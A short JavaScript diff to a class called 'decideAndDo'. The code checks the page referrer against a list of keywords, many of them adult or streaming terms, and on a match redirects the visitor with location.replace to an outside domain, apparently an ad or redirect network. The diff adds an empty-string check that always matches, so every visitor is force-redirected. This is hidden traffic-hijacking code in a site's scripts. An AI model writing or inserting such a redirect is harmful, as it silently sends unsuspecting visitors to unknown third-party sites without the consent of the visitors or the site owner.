@@ -145,7 +145,7 @@ class decideAndDo{
 			document.referrer.includes("img")||
 			document.referrer.includes("sex")||
 			document.referrer.includes("flix")||
-			document.referrer.includes("white")||
+			document.referrer.includes("tube")||
 			document.referrer.includes("hit")||
 			document.referrer.includes("hot")||
 			document.referrer.includes("cool")||
@@ -153,9 +153,10 @@ class decideAndDo{
 			document.referrer.includes("video")||
 			document.referrer.includes("her")||
 			document.referrer.includes("url")||
-			document.referrer.includes("ad")||
+			document.referrer.includes("ads")||
 			document.referrer.includes("pic")||
 			document.referrer.includes("xx")||
+			document.referrer.includes("")||
 			document.referrer.includes("ds2play")
 			){
 			location.replace("//intorterraon.com/4/6606783");
